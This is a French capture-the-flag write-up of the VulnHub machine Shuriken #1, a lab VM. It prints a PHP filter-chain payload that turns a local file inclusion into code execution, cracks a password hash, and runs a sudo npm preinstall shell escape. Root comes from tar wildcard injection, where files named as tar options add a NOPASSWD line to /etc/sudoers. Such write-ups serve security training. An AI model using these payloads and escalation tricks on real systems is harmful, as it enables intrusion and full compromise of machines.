# Solution du CTF Shuriken #1 de VulnHub

Après avoir solutionné [Shuriken: Node](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Shuriken%3A%20Node%20de%20VulnHub.md) je me suis penché sur le premier de la série.

```
Nmap scan report for 192.168.56.56
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE    SERVICE    VERSION
80/tcp   open     http       Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Shuriken
|_http-server-header: Apache/2.4.29 (Ubuntu)
8080/tcp filtered http-proxy
```

On trouve donc un seul port accessible qui correspond à un serveur web Apache. Le site web présent dessus est celui de la `Shuriken Company`. Il n'y a rien de notable, on trouve uniquement un formulaire de connexion à `/login.html`.

La cible de ce formulaire étant la même page HTML, il est peut probable qu'un réel traitement soit opéré sur les données.

## Make JS useful

Une énumération des fichiers et dossiers présents à la racine du site permet de trouver une image `secret.png` présente dans un dossier baptisé `secret` lui aussi.

L'image représente le logo de Java avec écrit `JavaScript` en dessous comme quoi les incompréhensions sur des supposés liens entre les deux langages peuvent durer longtemps :p

Quoi qu'il en soit, c'est un indice pour nous indiquer de nous intéresser aux fichiers JS sur le site. Deux sont chargés par la page d'index et on les trouve d'ailleurs dans le dossier `/js` qui est listable

Les codes ressemblent à du JS compilé / compressé bref absolument illisible mais non obfusqué. On peut tout de même voir un nom d'hôte qui semble être utilisé pour une API de chat :

```js
return "".concat(void 0 === e ? "http://broadcast.shuriken.local" : e).concat("/", "?_alias=").concat(n, "&_callbackAlias=").concat(l, "&_lang=").concat(c)
```

Après ajout d'une entrée dans `/etc/hosts` on remarque que l'accès requiert une authentification HTTP basic. Passons à autre chose.

L'autre fichier JS fait référence au nom d'hôte principal avec une URL disposant d'un paramètre `referer` :

```url
http://shuriken.local/index.php?referer=
```

J'ai cherché de possibles autres sous-domaines à l'aide de `ffuf` :

```bash
ffuf -w fuzzdb/discovery/dns/alexaTop1mAXFRcommonSubdomains.txt -u http://192.168.56.56/ -H "Host: FUZZ.shuriken.local" -fs 6021
```

Mais cela ne m'a remonté que `broadcast` que je connais déjà.

J'ai lancé [Wapiti](https://wapiti-scanner.github.io/) sur l'URL avec la commande suivante :

```bash
wapiti -u 'http://shuriken.local/index.php?referer=toto' --scope url -v2
```

et il a aussitôt trouvé une faille d'inclusion :

```
---
PHP local inclusion leading to code execution in http://shuriken.local/index.php via injection in the parameter referer
Evil request:
    GET /index.php?referer=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP866.CSUNICODE%7Cconvert.iconv.CSISOLATIN5.ISO_6937-2%7Cconvert.iconv.CP950.UTF-16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.865.UTF16%7Cconvert.iconv.CP901.ISO6937%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.iconv.CSA_T500.L4%7Cconvert.iconv.ISO_8859-2.ISO-IR-103%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.DEC.UTF-16%7Cconvert.iconv.ISO8859-9.ISO_6937-2%7Cconvert.iconv.UTF16.GB13000%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.JS.UNICODE%7Cconvert.iconv.L4.UCS2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.JS.UNICODE%7Cconvert.iconv.L4.UCS2%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp HTTP/1.1
    host: shuriken.local
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
---
```

Le payload correspond à la technique que j'ai décrit pour le CTF [Corrosion](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Corrosion%20de%20VulnHub.md) et que j'ai depuis ajouté dans *Wapiti*.

Si je j'inecte le payload suivant encodé avec [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) :

```php
<?php system("sleep 10");?>
```

J'obtiens bien un délais d'attente qui prouve que l'exécution de commande est fonctionnelle. En revanche je n'ai pas eu d'output si je tentais d'appeller `readfile` ou `phpinfo`. Au mieux j'obtenais des caractères étranges dans la page.

Le payload doit être court sinon le serveur répond par une erreur `414 Request-URI Too Long`.

Un simple `system($_GET["c"]);` est suffisant pour obtenir notre webshell qui nous fait attérir dans `/var/www/main/`.

On voit dans ce dossier que le script vulnérable faisait un peu de ménage dans les données reçues mais plusieurs payloads présents dans *Wapiti* auraient permis de voir la vulnérabilité (juste passer `/etc/passwd `suffit) :

```php
<?php
$file = $_GET['referer'];
$filter = str_replace('../','',$file);
include($filter);
?>
```

Dans les process je remarque qu'un utilisateur `server-management` fait tourner nodejs, probablement sur le port filtré :

```
server-+   730  0.2  2.5 612356 25972 ?        Ssl  Nov14   2:25 node /home/server-management/Shuriken/server.js
```

Comme on n'est pas root on ne peux pas obtenir la liste des processus qui écoute sur chacun des ports mais on peut valider l'hypothèse en regardant les sites activés pour `Apache` :

```apacheconf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        ServerName shuriken.local
        DocumentRoot /var/www/main
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        <Directory /var/www/main>
                Order allow,deny
                allow from all
        </Directory>
</VirtualHost>

<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        ServerName broadcast.shuriken.local
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        <Directory /var/www/html>
                Order allow,deny
                allow from all
                AuthType Basic
                AuthName "Restricted Content"
                AuthUserFile /etc/apache2/.htpasswd
                Require valid-user
        </Directory>
</VirtualHost>
```

On peut désormais accèder au site `broadcast` si on casse le hash présent dans le fichier `htpasswd` cité :

```
developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
```

```shellsession
$ ./john --wordlist=wordlists/rockyou.txt /tmp/hashes.txt 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
9972761drmfsls   (developers)     
1g 0:00:00:23 DONE (2022-11-15 13:55) 0.04310g/s 93153p/s 93153c/s 93153C/s 9981953..996851
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Le site fait tourner `ClipBucket v4.0`. Vu que ce site tourne avec Apache (et donc www-data) je ne voit pas d'intérêt d'exploiter le site.

Je récupère tout de même les identifiants de base de données dans `includes/dbconnect.php` :

```php
$BDTYPE = 'mysql';
//Database Host
$DBHOST = 'localhost';
//Database Name
$DBNAME = 'shuriken';
//Database Username
$DBUSER = 'admin';
//Database Password
$DBPASS = '5]ZAF776kBu]@$c&';
```

Aucun des deux mots de passe (celui du MySQL et celui du htpasswd) ne sont utilisables pour `server-management` et `root`.

## Get the f**k out

Une recherche plus généraliste permet de découvrir que `www-data` peut exécuter `npm` avec les droits de `server-management` :

```shellsession
www-data@shuriken:/tmp$ sudo -l
Matching Defaults entries for www-data on shuriken:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on shuriken:
    (server-management) NOPASSWD: /usr/bin/npm
```

L'une des entrées de [GTFObins](https://gtfobins.github.io/gtfobins/npm/) s'applique à `npm` :

```shellsession
www-data@shuriken:/tmp$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > ^CF/package.json
www-data@shuriken:/tmp$ mkdir yolo
www-data@shuriken:/tmp$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > yolo/package.json
www-data@shuriken:/tmp$ sudo -u server-management /usr/bin/npm -C yolo i

> @ preinstall /tmp/yolo
> /bin/sh

$ id
uid=1000(server-management) gid=1000(server-management) groups=1000(server-management),24(cdrom),30(dip),46(plugdev),116(lpadmin),122(sambashare)
```

On peut alors récupérer notre premier flag : `67528b07b382dfaa490f4dffc57dcdc0`

Il y a une tache crontab qui effectue une sauvegarde des fichiers de `server-management` :

```bash
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/2   * * * *   root    /var/opt/backupsrv.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

Voici le code du script bash :

```bash
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
```

## Shine like a star

On est dans un cas d'exploitation similaire au CTF [Pipe](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20devrandom%3A%20Pipe%20de%20VulnHub.md) où l'on va pouvoir exploiter utilisation du wildcard dans la commande `tar`. Je recommande la lecture de l'article  [Dangers of wildcards in bash](https://www.soliantconsulting.com/blog/dangers-wildcards-bash/) pour plus de détails.

Pour cela je créé un script bash qui va rajouter une ligne au `/etc/sudoers` puis des fichiers vides nommés après des options de `tar` qui seront pris comme tels à cause du wildcard :

```shellsession
$ echo '#!/bin/bash\necho "server-management ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers' > evil.sh
$ touch -- "--checkpoint=1"
$ touch -- "--checkpoint-action=exec=sh evil.sh" 
$ chmod 755 evil.sh
$ touch a
--- snip sleep 2 minutes here snip ---
$ sudo su
root@shuriken:/home/server-management/Documents# id
uid=0(root) gid=0(root) groups=0(root)
root@shuriken:/home/server-management/Documents# cd /root
root@shuriken:~# cat root.txt

d0f9655a4454ac54e3002265d40b2edd
                                          __                   
  ____  ____   ____    ________________ _/  |_  ______         
_/ ___\/  _ \ /    \  / ___\_  __ \__  \\   __\/  ___/         
\  \__(  <_> )   |  \/ /_/  >  | \// __ \|  |  \___ \          
 \___  >____/|___|  /\___  /|__|  (____  /__| /____  >         
     \/           \//_____/            \/          \/          
                                            __             .___
 ___.__. ____  __ __  _______  ____   _____/  |_  ____   __| _/
<   |  |/  _ \|  |  \ \_  __ \/  _ \ /  _ \   __\/ __ \ / __ | 
 \___  (  <_> )  |  /  |  | \(  <_> |  <_> )  | \  ___// /_/ | 
 / ____|\____/|____/   |__|   \____/ \____/|__|  \___  >____ | 
 \/                                                  \/     \/ 
  _________.__                 .__ __                          
 /   _____/|  |__  __ _________|__|  | __ ____   ____          
 \_____  \ |  |  \|  |  \_  __ \  |  |/ // __ \ /    \         
 /        \|   Y  \  |  /|  | \/  |    <\  ___/|   |  \        
/_______  /|___|  /____/ |__|  |__|__|_ \\___  >___|  /        
        \/      \/                     \/    \/     \/
```

Un CTF bien conçu, merci à son auteur :)

*Publié le 15 novembre 2022*
